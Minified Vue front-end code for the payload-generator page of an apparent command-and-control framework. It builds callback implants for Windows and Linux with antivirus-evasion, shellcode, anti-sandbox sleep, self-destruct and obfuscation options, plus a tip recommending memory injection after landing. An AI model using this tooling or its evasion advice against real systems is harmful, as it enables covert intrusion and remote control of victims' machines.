import{_ as be,o as we,g as H,X as ye,E as T,a as ge,b as V,c as L,e as l,w as t,n as ke,T as K,m as g,h as u,s as P,B as $,d as o,u as v,N as Z,q as i,f as Y,F as xe,r as Ve,t as k,l as Ue,Y as Q,L as Te,k as Ce,Z as Se,$ as he,a0 as Re,a1 as $e,j as ee,a2 as Be}from"./index-DG_0wL7P.js";import{x as Le,a as ze}from"./xterm-nVmz_L2e.js";const Oe={class:"payload-page"},Ee={class:"card-header"},Pe={class:"title-with-icon"},Ie={class:"platform-selector"},We={class:"os-group"},Ae={class:"os-label"},De={class:"os-group",style:{"margin-top":"15px"}},je={class:"os-label"},Ne={class:"listener-option"},Fe={class:"l-addr"},Xe={key:0,class:"preview-box"},Ge={class:"preview-item"},qe={class:"preview-item"},Me={class:"p-value"},Je={class:"preview-item"},He={class:"p-value"},Ke={class:"preview-item"},Ze={class:"footer-action"},Ye={class:"url-preview"},Qe={class:"u-content"},el={class:"stat-inner"},ll={class:"stat-value"},tl={class:"tip-header"},ol={class:"custom-dialog-header"},sl={class:"el-dialog__title"},al={class:"header-btns"},nl={class:"terminal-dialog-body"},dl={class:"term-toolbar"},il={class:"toolbar-left"},ul={key:0,class:"task-id-mini"},rl={class:"toolbar-right"},pl={class:"term-body"},cl={class:"bubble-content"},ml={class:"bubble-text"},_l={__name:"PayloadGenerator",setup(fl){const z=g(!1),S=g([]),A=g([]),O=g(!1),h=g(!1),x=g(""),C=g([]);let p=null,I=null,b=null;const D=g(null),j=g(!0),s=g({combinedType:"windows_amd64",listenerId:"",lhost:window.location.hostname||"127.0.0.1",mode:"build",asShellcode:!1,autoDestruct:!1,sleepTime:0,aesKey:"",useUPX:!1,encryption_salt:"",obfuscation_mode:"none"});we(async()=>{try{const n=await H.get("/api/dashboard");j.value=n.data.templates_ready}catch(n){console.warn("Failed to fetch template status",n)}try{const n=await ye();S.value=n.data.filter(e=>e.status==="Running"),S.value.length>0&&(s.value.listenerId=S.value[0].id,N(s.value.listenerId))}catch{T.error("获取监听器列表失败")}}),ge(()=>{b&&b.close(),p&&p.dispose()});const y=ee(()=>S.value.find(n=>n.id===s.value.listenerId)),le=ee(()=>{if(!y.value)return"---";const n=y.value.protocol.toLowerCase();return n==="websocket"?`ws://${s.value.lhost}:${y.value.port}/ws`:n==="dns"?`${y.value.ns_domain}`:`${n}://${s.value.lhost}:${y.value.port}`}),N=n=>{const e=S.value.find(d=>d.id===n);e&&(s.value.aesKey=e.encrypt_key||"",s.value.encryption_salt=e.encryption_salt||"",s.value.obfuscation_mode=e.obfuscate_mode||"none",s.value.encryption_salt||console.warn("Selected listener has no encryption salt configured."),(e.protocol==="DNS"||e.protocol==="TCP")&&(s.value.mode="build"))},F=n=>({WebSocket:"success",DNS:"warning",TCP:"primary"})[n]||"info",te=()=>{p||(p=new Le.Terminal({theme:{background:"#1a1b26",foreground:"#a9b1d6",cursor:"#f7768e",selection:"rgba(255, 255, 255, 0.3)"},fontSize:12,fontFamily:'"JetBrains Mono", monospace',convertEol:!0}),I=new ze.FitAddon,p.loadAddon(I),p.open(D.value),I.fit())},oe=n=>{x.value=n,O.value=!0},se=()=>{te(),p.writeln(`\x1B[33m[*] 正在连接构建任务流 [${x.value}]...\x1B[0m`);let n="";if(!n.startsWith("ws")){const c=window.location.protocol==="https:"?"wss:":"ws:";n=n?n.replace("http","ws"):`${c}//${window.location.host}`}const e=localStorage.getItem("cupcake_token"),d=`${n}/api/build/logs/${x.value}${e?"?token="+encodeURIComponent(e):""}`;b&&b.close(),b=new WebSocket(d),b.onopen=()=>{p.writeln("\x1B[32m[*] 已连接到构建服务器\x1B[0m")},b.onmessage=c=>{const r=JSON.parse(c.data),f=r.type||r.msg_type,m=r.content||r.downloadUrl,_=(r.content||"").replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g,"");f==="log"?(p.writeln(r.content),C.value.push(_)):f==="success"?(p.writeln(`\x1B[32m[SUCCESS] 构建完成: ${m}\x1B[0m`),C.value.push(`[SUCCESS] 构建完成: ${m}`),ne(m)):f==="error"&&(p.writeln(`\x1B[31m[ERROR] 编译失败: ${m}\x1B[0m`),C.value.push(`[ERROR] 编译失败: ${m}`))},b.onerror=c=>{p.writeln("\x1B[31m[ERROR] WebSocket 连接失败\x1B[0m"),console.error("WebSocket error:",c)},b.onclose=()=>{p&&p.writeln("\x1B[90m[*] 任务连接已断开\x1B[0m")}},ae=()=>{h.value=!1,b&&(b.close(),b=null),p&&(p.dispose(),p=null)},ne=async n=>{try{T.info("正在准备安全下载通道...");const e=await H.get(n,{responseType:"blob"}),d=new Blob([e.data],{type:"application/octet-stream"}),c=window.URL.createObjectURL(d),r=document.createElement("a");r.href=c;const f=n.split("/").pop()||"agent.exe";r.setAttribute("download",f),document.body.appendChild(r),r.click(),document.body.removeChild(r),window.URL.revokeObjectURL(c),T.success("生成成功，文件已保存到本地")}catch(e){console.error("Download error:",e),T.error("产物提取失败: 权限验证过期或网络异常")}},de=()=>{if(C.value.length===0)return;const n=new Blob([C.value.join(`
`)],{type:"text/plain"}),e=window.URL.createObjectURL(n),d=document.createElement("a");d.href=e,d.setAttribute("download",`build_log_${x.value.slice(0,8)}_${new Date().getTime()}.txt`),document.body.appendChild(d),d.click(),document.body.removeChild(d),window.URL.revokeObjectURL(e),T.success("日志已导出")},ie=()=>{p&&p.clear(),C.value=[]},ue=async()=>{var n,e;if(!s.value.listenerId)return T.warning("请选择一个有效的监听器");z.value=!0;try{const d={os:s.value.combinedType.split("_")[0],arch:s.value.combinedType,listener_id:s.value.listenerId,host:s.value.lhost,method:s.value.mode,as_shellcode:s.value.asShellcode,auto_destruct:s.value.autoDestruct,sleep_time:s.value.sleepTime,aes_key:s.value.aesKey,use_upx:s.value.useUPX,encryption_salt:s.value.encryption_salt,obfuscation_mode:s.value.obfuscation_mode},r=(await Be(d)).data;if(r.type==="application/json"||r.size<2048){const f=await r.text();try{const m=JSON.parse(f);if(m.task_id){console.log("Async Task started:",m.task_id),oe(m.task_id);return}}catch{console.log("Response is not an async task, proceeding to download")}}re(r,s.value.combinedType,d.os,s.value.asShellcode),s.value.mode!=="build"&&T.success("补丁生成成功")}catch(d){console.error("Generation error:",d),T.error("生成异常: "+(((e=(n=d.response)==null?void 0:n.data)==null?void 0:e.error)||d.message))}finally{z.value=!1}},re=(n,e,d,c)=>{const m=`agent_${e}${c?".bin":d==="windows"?".exe":""}`,_=new Blob([n],{type:"application/octet-stream"}),U=window.URL.createObjectURL(_),R=document.createElement("a");R.href=U,R.setAttribute("download",m),R.click(),window.URL.revokeObjectURL(U)};return(n,e)=>{const d=u("el-icon"),c=u("el-tag"),r=u("el-alert"),f=u("el-radio-button"),m=u("el-radio-group"),_=u("el-form-item"),U=u("el-option"),R=u("el-select"),w=u("el-col"),X=u("el-input"),B=u("el-row"),G=u("el-tooltip"),q=u("el-radio"),pe=u("el-checkbox"),ce=u("el-input-number"),M=u("el-switch"),J=u("el-divider"),me=u("el-collapse-item"),_e=u("el-collapse"),E=u("el-button"),fe=u("el-form"),W=u("el-card"),ve=u("el-dialog");return V(),L("div",Oe,[l(B,{gutter:20},{default:t(()=>[l(w,{span:18},{default:t(()=>[l(W,{shadow:"never",class:"main-card"},{header:t(()=>[o("div",Ee,[o("span",Pe,[l(d,null,{default:t(()=>[l(v(Z))]),_:1}),e[15]||(e[15]=i(" 受控端生成 (Payload Generator)",-1))]),l(c,{type:"info",size:"small",effect:"plain"},{default:t(()=>[...e[16]||(e[16]=[i("插件管理中心",-1)])]),_:1})])]),default:t(()=>[l(fe,{model:s.value,"label-position":"top",class:"professional-form"},{default:t(()=>[l(K,{name:"el-zoom-in-top"},{default:t(()=>[!j.value&&s.value.mode==="patch"?(V(),P(r,{key:0,title:"受控端基础模板未就绪",type:"warning",description:"‘二进制补丁’模式需要服务端存在预编译模板。请在服务端终端运行 ./generate_templates.sh，或切换到‘源码级编译’模式。","show-icon":"",closable:!1,style:{"margin-bottom":"20px"}})):$("",!0)]),_:1}),l(_,{label:"1. 选择目标平台 (High Value Targets)",required:""},{default:t(()=>[o("div",Ie,[o("div",We,[o("span",Ae,[l(d,null,{default:t(()=>[l(v(Z))]),_:1}),e[17]||(e[17]=i(" Windows",-1))]),l(m,{modelValue:s.value.combinedType,"onUpdate:modelValue":e[0]||(e[0]=a=>s.value.combinedType=a)},{default:t(()=>[l(f,{label:"windows_amd64"},{default:t(()=>[...e[18]||(e[18]=[i("Win x64",-1)])]),_:1}),l(f,{label:"windows_i386"},{default:t(()=>[...e[19]||(e[19]=[i("Win x86",-1)])]),_:1})]),_:1},8,["modelValue"])]),o("div",De,[o("span",je,[l(d,null,{default:t(()=>[l(v(Y))]),_:1}),e[20]||(e[20]=i(" Linux",-1))]),l(m,{modelValue:s.value.combinedType,"onUpdate:modelValue":e[1]||(e[1]=a=>s.value.combinedType=a)},{default:t(()=>[l(f,{label:"linux_amd64"},{default:t(()=>[...e[21]||(e[21]=[i("Linux x64",-1)])]),_:1}),l(f,{label:"linux_arm64"},{default:t(()=>[...e[22]||(e[22]=[i("Linux Arm64",-1)])]),_:1})]),_:1},8,["modelValue"])])])]),_:1}),l(B,{gutter:20},{default:t(()=>[l(w,{span:12},{default:t(()=>[l(_,{label:"2. 选择回连监听器",required:""},{default:t(()=>[l(R,{modelValue:s.value.listenerId,"onUpdate:modelValue":e[2]||(e[2]=a=>s.value.listenerId=a),style:{width:"100%"},placeholder:"请选择在线监听器",size:"large",onChange:N},{default:t(()=>[(V(!0),L(xe,null,Ve(S.value,a=>(V(),P(U,{key:a.id,label:`${a.protocol.toUpperCase()} - ${a.bind_ip}:${a.port}`,value:a.id},{default:t(()=>[o("div",Ne,[l(c,{type:F(a.protocol),size:"small",effect:"dark"},{default:t(()=>[i(k(a.protocol),1)]),_:2},1032,["type"]),o("span",Fe,k(a.bind_ip)+":"+k(a.port),1)])]),_:2},1032,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1})]),_:1}),l(w,{span:12},{default:t(()=>[l(_,{label:"3. 配置回连地址 (C2 Host Override)"},{default:t(()=>[l(X,{modelValue:s.value.lhost,"onUpdate:modelValue":e[3]||(e[3]=a=>s.value.lhost=a),placeholder:"例如: 1.2.3.4 或 c2.domain.com",size:"large"},{prepend:t(()=>[l(d,null,{default:t(()=>[l(v(Ue))]),_:1})]),_:1},8,["modelValue"])]),_:1})]),_:1})]),_:1}),y.value?(V(),L("div",Xe,[o("div",Ge,[e[23]||(e[23]=o("span",{class:"p-label"},"回连协议",-1)),l(c,{size:"small",type:F(y.value.protocol)},{default:t(()=>[i(k(y.value.protocol),1)]),_:1},8,["type"])]),o("div",qe,[e[24]||(e[24]=o("span",{class:"p-label"},"监听端口",-1)),o("b",Me,k(y.value.port),1)]),o("div",Je,[e[25]||(e[25]=o("span",{class:"p-label"},"交互频率",-1)),o("b",He,k(y.value.heartbeat_interval||10)+"s",1)]),o("div",Ke,[e[27]||(e[27]=o("span",{class:"p-label"},"加密算法",-1)),l(c,{type:"success",size:"small",effect:"plain"},{default:t(()=>[...e[26]||(e[26]=[i("AES-256-GCM",-1)])]),_:1})])])):$("",!0),l(B,{gutter:20,class:"options-row"},{default:t(()=>[l(w,{span:12},{default:t(()=>[l(_,{label:"4. 生成模式"},{default:t(()=>[l(m,{modelValue:s.value.mode,"onUpdate:modelValue":e[4]||(e[4]=a=>s.value.mode=a)},{default:t(()=>[l(q,{label:"patch"},{default:t(()=>[e[28]||(e[28]=i(" 二进制补丁 (极速) ",-1)),l(G,{content:"通过修改预编译模板字节实现，秒级生成。架构需匹配模板。",placement:"top"},{default:t(()=>[l(d,{class:"info-icon"},{default:t(()=>[l(v(Q))]),_:1})]),_:1})]),_:1}),l(q,{label:"build"},{default:t(()=>[e[29]||(e[29]=i(" 源码级编译 (推荐) ",-1)),l(G,{content:"服务端实时调用 Rust 编译器，生成过程约 20-40s，免杀效果更佳。",placement:"top"},{default:t(()=>[l(d,{class:"info-icon"},{default:t(()=>[l(v(Q))]),_:1})]),_:1})]),_:1})]),_:1},8,["modelValue"])]),_:1})]),_:1}),l(w,{span:12},{default:t(()=>[s.value.combinedType.startsWith("windows")?(V(),P(_,{key:0,label:"5. 免杀增强 (Bypass Options)"},{default:t(()=>[l(pe,{modelValue:s.value.asShellcode,"onUpdate:modelValue":e[5]||(e[5]=a=>s.value.asShellcode=a),border:"",size:"default",class:"shellcode-check"},{default:t(()=>[...e[30]||(e[30]=[i(" 生成 Shellcode (.bin) 用于内存加载 ",-1)])]),_:1},8,["modelValue"])]),_:1})):$("",!0)]),_:1})]),_:1}),l(_e,{modelValue:A.value,"onUpdate:modelValue":e[11]||(e[11]=a=>A.value=a),class:"advanced-collapse"},{default:t(()=>[l(me,{title:"隐蔽行为配置 (Stealth Behaviors)",name:"stealth"},{default:t(()=>[l(B,{gutter:40},{default:t(()=>[l(w,{span:12},{default:t(()=>[l(_,{label:"抗沙箱休眠 (Sleep Timer)"},{default:t(()=>[l(ce,{modelValue:s.value.sleepTime,"onUpdate:modelValue":e[6]||(e[6]=a=>s.value.sleepTime=a),min:0,max:600,size:"small"},null,8,["modelValue"]),e[31]||(e[31]=o("span",{class:"form-hint"},"秒 (运行前进入深呼吸模拟，绕过动态检测)",-1))]),_:1})]),_:1}),l(w,{span:12},{default:t(()=>[l(_,{label:"运行后自毁 (Self Destruct)"},{default:t(()=>[l(M,{modelValue:s.value.autoDestruct,"onUpdate:modelValue":e[7]||(e[7]=a=>s.value.autoDestruct=a),"active-color":"#f56c6c"},null,8,["modelValue"]),e[32]||(e[32]=o("span",{class:"form-hint"},"执行一次自动上线后立即尝试删除自身二进制",-1))]),_:1})]),_:1}),l(w,{span:12},{default:t(()=>[l(_,{label:"UPX 极限压缩 (Compression)"},{default:t(()=>[l(M,{modelValue:s.value.useUPX,"onUpdate:modelValue":e[8]||(e[8]=a=>s.value.useUPX=a),"active-color":"#409EFF"},null,8,["modelValue"]),e[33]||(e[33]=o("span",{class:"form-hint"},"通过 UPX 压缩二进制体积 (约缩减 60%)",-1))]),_:1})]),_:1})]),_:1}),l(J,null,{default:t(()=>[l(d,null,{default:t(()=>[l(v(Te))]),_:1}),e[34]||(e[34]=i(" 安全加固 (Security Hardening)",-1))]),_:1}),l(B,{gutter:40},{default:t(()=>[l(w,{span:12},{default:t(()=>[l(_,{label:"加密盐值 (Encryption Salt)"},{default:t(()=>[l(X,{modelValue:s.value.encryption_salt,"onUpdate:modelValue":e[9]||(e[9]=a=>s.value.encryption_salt=a),placeholder:"由所选监听器自动填入",size:"small",readonly:""},{prepend:t(()=>[l(d,null,{default:t(()=>[l(v(Ce))]),_:1})]),_:1},8,["modelValue"]),e[35]||(e[35]=o("span",{class:"form-hint"},"此项已根据所选监听器自动锁定",-1))]),_:1})]),_:1}),l(w,{span:12},{default:t(()=>[l(_,{label:"报文混淆 (Packet Obfuscation)"},{default:t(()=>[l(R,{modelValue:s.value.obfuscation_mode,"onUpdate:modelValue":e[10]||(e[10]=a=>s.value.obfuscation_mode=a),style:{width:"100%"},size:"small",disabled:""},{default:t(()=>[l(U,{label:"无混淆 (None)",value:"none"}),l(U,{label:"垃圾数据填充 (Junk Padding)",value:"junk"}),l(U,{label:"Base64 编码 (文本特征)",value:"base64"}),l(U,{label:"XOR 混淆 (高熵特征)",value:"xor"})]),_:1},8,["modelValue"]),e[36]||(e[36]=o("span",{class:"form-hint"},"此项已根据所选监听器自动锁定",-1))]),_:1})]),_:1})]),_:1})]),_:1})]),_:1},8,["modelValue"]),o("div",Ze,[o("div",Ye,[e[37]||(e[37]=o("span",{class:"u-title"},"预览 Agent 回连特征:",-1)),o("span",Qe,k(le.value),1)]),l(E,{type:"warning",size:"large",class:"generate-btn",loading:z.value,onClick:ue},{default:t(()=>[z.value?$("",!0):(V(),P(d,{key:0},{default:t(()=>[l(v(Se))]),_:1})),e[38]||(e[38]=i(" 立即生成并分发受控端 ",-1))]),_:1},8,["loading"])])]),_:1},8,["model"])]),_:1})]),_:1}),l(w,{span:6},{default:t(()=>[l(W,{shadow:"never",class:"stat-card"},{default:t(()=>[o("div",el,[e[40]||(e[40]=o("div",{class:"stat-label"},"Payloads Generated",-1)),o("div",ll,[e[39]||(e[39]=i("2,841 ",-1)),l(d,null,{default:t(()=>[l(v(he))]),_:1})]),e[41]||(e[41]=o("div",{class:"stat-trend"},"+12 Today",-1))])]),_:1}),l(W,{shadow:"never",class:"tip-card"},{header:t(()=>[o("div",tl,[l(d,null,{default:t(()=>[l(v(Re))]),_:1}),e[42]||(e[42]=i(" 安全开发提示",-1))])]),default:t(()=>[e[43]||(e[43]=o("ul",{class:"tip-list"},[o("li",null,[o("span",{class:"t-badge"},"免杀"),o("p",null,[i("生成的二进制文件建议配合"),o("b",null,"流量层混淆"),i("，并在上线后第一时间通过"),o("b",null,"内存注入"),i("迁移。 ")])]),o("li",null,[o("span",{class:"t-badge"},"特权"),o("p",null,[i("监听器的低端口 (如 53, 443, 80) 在特定 Linux/Windows 系统下运行受控端可能需要"),o("b",null,"管理员/Root"),i("权限。 ")])]),o("li",null,[o("span",{class:"t-badge"},"补丁"),o("p",null,[i("二进制补丁模式仅支持 amd64 基础模板，如需其他架构请使用"),o("b",null,"源码编译"),i("模式。")])])],-1))]),_:1})]),_:1})]),_:1}),l(ve,{modelValue:O.value,"onUpdate:modelValue":e[13]||(e[13]=a=>O.value=a),title:`实时构建日志 (Task: ${x.value.slice(0,8)})`,width:"900px","close-on-click-modal":!1,"show-close":!h.value,"destroy-on-close":"",class:"terminal-dialog",style:ke({visibility:h.value?"hidden":"visible"}),onOpened:se,onClosed:ae},{header:t(()=>[o("div",ol,[o("span",sl,"实时构建日志 (Task: "+k(x.value.slice(0,8))+")",1),o("div",al,[l(E,{link:"",onClick:e[12]||(e[12]=a=>h.value=!0)},{default:t(()=>[l(d,null,{default:t(()=>[l(v($e))]),_:1})]),_:1})])])]),default:t(()=>[o("div",nl,[o("div",dl,[o("div",il,[l(c,{type:"info",size:"small",effect:"dark"},{default:t(()=>[...e[44]||(e[44]=[i("LIVE OUTPUT",-1)])]),_:1}),x.value?(V(),L("span",ul,"Task: "+k(x.value.slice(0,8)),1)):$("",!0)]),o("div",rl,[l(E,{link:"",size:"small",onClick:de,disabled:!C.value.length},{default:t(()=>[...e[45]||(e[45]=[i("导出日志",-1)])]),_:1},8,["disabled"]),l(J,{direction:"vertical"}),l(E,{link:"",size:"small",onClick:ie},{default:t(()=>[...e[46]||(e[46]=[i("清空屏幕",-1)])]),_:1})])]),o("div",pl,[o("div",{ref_key:"terminalContainer",ref:D,class:"xterm-mount"},null,512)])])]),_:1},8,["modelValue","title","show-close","style"]),l(K,{name:"el-zoom-in-bottom"},{default:t(()=>[h.value&&O.value?(V(),L("div",{key:0,class:"build-bubble",onClick:e[14]||(e[14]=a=>h.value=!1)},[o("div",cl,[l(d,{class:"pulse-icon"},{default:t(()=>[l(v(Y))]),_:1}),o("div",ml,[e[47]||(e[47]=o("span",null,"构建进行中...",-1)),o("small",null,k(x.value.slice(0,8)),1)])])])):$("",!0)]),_:1})])}}},wl=be(_l,[["__scopeId","data-v-eb696143"]]);export{wl as default};
